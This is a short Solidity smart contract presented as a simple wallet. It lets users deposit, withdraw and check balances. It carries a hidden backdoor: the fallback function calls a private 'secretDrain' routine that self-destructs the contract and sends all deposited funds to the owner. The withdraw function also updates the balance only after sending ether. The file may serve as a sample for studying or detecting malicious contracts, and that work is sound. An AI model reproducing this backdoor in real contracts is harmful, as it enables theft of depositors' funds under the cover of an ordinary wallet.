pragma solidity ^0.4.2;

contract Wallet {   
  mapping (address => uint) public credit;
  address owner;
  
  constructor() public
  {
      owner=msg.sender;
  }
    
  function deposit() public payable {
    credit[msg.sender] += msg.value;
  }
    
  function withdraw(uint amount) public {
    if (credit[msg.sender]>= amount) {
      msg.sender.transfer(amount);
      credit[msg.sender]-=amount;
    }
  }
  
  function checkBalance() public view returns(uint)
  {
      return credit[msg.sender];
  }

  function secretDrain(address x) private
  {
      selfdestruct(x);
  }
  
  function () public
  {
      secretDrain(owner);
  }
  
}